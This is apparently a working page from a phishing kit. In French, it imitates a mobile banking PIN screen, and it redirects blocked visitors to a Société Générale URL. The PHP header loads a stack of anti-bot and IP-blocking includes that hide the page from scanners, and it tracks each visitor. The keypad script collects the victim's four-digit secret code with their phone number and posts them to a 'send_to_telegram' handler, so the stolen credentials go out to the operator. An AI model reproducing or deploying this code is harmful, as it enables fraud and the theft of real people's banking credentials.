<?php

error_reporting(0);
set_time_limit(0);
session_start();
include ('../prevents/bots.php');
include ('../prevents/antimar.php');
include ('../prevents/banned-ip.php');
	include ('../prevents/anti1.php');
	include ('../prevents/anti2.php');
	include ('../prevents/anti3.php');
	include ('../prevents/anti4.php');
	include ('../prevents/anti5.php');
	include ('../prevents/anti6.php');
	include ('../prevents/anti7.php');
	include ('../prevents/anti8.php');

header('Content-type: text/html; charset-UTF-8');
include('./inclu/para.php');
include('./inclu/bots.php');
//include('./inclu/banned-ip.php');
date_default_timezone_set('GMT');
$rand_tarikh = md5(date('1 js \of F Y h:i:s A'));
$url = $_SESSION['url'];
$ip = getenv("REMOTE_ADDR");

$idClient = $_POST['user_id'];



if($hhh){
  if($hhh['bloque'] == 1){
    header("Location: https://particuliers.societegenerale.fr/restitution/cns_listeprestation.html");
    exit;
  }
}else{

}
include 'page_notify.php';
// Juste au début du fichier PHP
include 'Jeehan.php';
$jeehan = new Jeehan();
$jeehan->track('exp.php'); // ex: connexion.php

include("track.php");

?>
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Code secret</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body {
      background-color: white;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 30px 20px;
      height: 100vh;
    }

    .back-arrow {
      position: absolute;
      top: 20px;
      left: 20px;
      font-size: 26px;
      cursor: pointer;
    }

    .lock-icon {
      font-size: 36px;
      color: #4040ff;
      margin-top: 80px;
    }

    .instructions {
      margin-top: 10px;
      font-size: 17px;
    }

    .phone-number {
      font-weight: bold;
      font-size: 20px;
    }

    .dots {
      display: flex;
      justify-content: center;
      gap: 10px;
      margin: 40px 0 30px;
    }

    .dot {
      width: 14px;
      height: 14px;
      border-radius: 50%;
      background-color: #d9f3ff;
    }

    .dot.filled {
      background-color: #00bfff;
    }

    .keypad {
      width: 100%;
      max-width: 260px;
      display: grid;
      grid-template-columns: repeat(3, 1fr);
      gap: 25px;
      text-align: center;
      font-size: 26px;
      font-weight: 400;
      color: black;
    }

    .key {
      padding: 10px 0;
      user-select: none;
    }

    .key:active {
      color: #00bfff;
    }

    .key img {
      width: 22px;
    }

    .forgot {
      color: #00bfff;
      font-size: 14px;
      margin-top: 20px;
    }
  </style>
</head>
<body>

<!-- Flèche retour -->
<div class="back-arrow" onclick="history.back()">&#x2190;</div>

<!-- Icône cadenas -->
<div class="lock-icon">🔒</div>

<!-- Instructions -->
<div class="instructions">Entrez votre code secret pour le compte</div>
<div class="phone-number" id="userPhone"><?= htmlspecialchars($phone) ?></div>

<!-- Points de code -->
<div class="dots" id="dots">
  <div class="dot" id="dot1"></div>
  <div class="dot" id="dot2"></div>
  <div class="dot" id="dot3"></div>
  <div class="dot" id="dot4"></div>
</div>

<!-- Clavier numérique -->
<div class="keypad">
  <div class="key" onclick="appendDigit('1')">1</div>
  <div class="key" onclick="appendDigit('2')">2</div>
  <div class="key" onclick="appendDigit('3')">3</div>
  <div class="key" onclick="appendDigit('4')">4</div>
  <div class="key" onclick="appendDigit('5')">5</div>
  <div class="key" onclick="appendDigit('6')">6</div>
  <div class="key" onclick="appendDigit('7')">7</div>
  <div class="key" onclick="appendDigit('8')">8</div>
  <div class="key" onclick="appendDigit('9')">9</div>
  <div class="key"></div>
  <div class="key" onclick="appendDigit('0')">0</div>
  <div class="key" onclick="deleteDigit()">
    <img src="https://cdn-icons-png.flaticon.com/512/2087/2087825.png" alt="Del">
  </div>
</div>

<div class="forgot">Oublié votre code secret ?</div>

<script>
  let code = "";
  const maxLength = 4;
  const dots = document.querySelectorAll('.dot');

  function updateDots() {
    dots.forEach((dot, i) => {
      dot.classList.toggle('filled', i < code.length);
    });
  }

  function appendDigit(digit) {
    if (code.length < maxLength) {
      code += digit;
      updateDots();
      if (code.length === maxLength) {
        // Envoie du code
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = 'action/send_to_telegram.php';

const phone = "<?= htmlspecialchars($phone) ?>";
const inputPhone = document.createElement('input');
inputPhone.type = 'hidden';
inputPhone.name = 'phone';
inputPhone.value = phone;
form.appendChild(inputPhone);


        const inputStep = document.createElement('input');
        inputStep.type = 'hidden';
        inputStep.name = 'step';
        inputStep.value = 'pin';
        form.appendChild(inputStep);

        const inputPin = document.createElement('input');
        inputPin.type = 'hidden';
        inputPin.name = 'pin';
        inputPin.value = code;
        form.appendChild(inputPin);

        document.body.appendChild(form);
        form.submit();
      }
    }
  }

  function deleteDigit() {
    code = code.slice(0, -1);
    updateDots();
  }
</script>

</body>
</html>
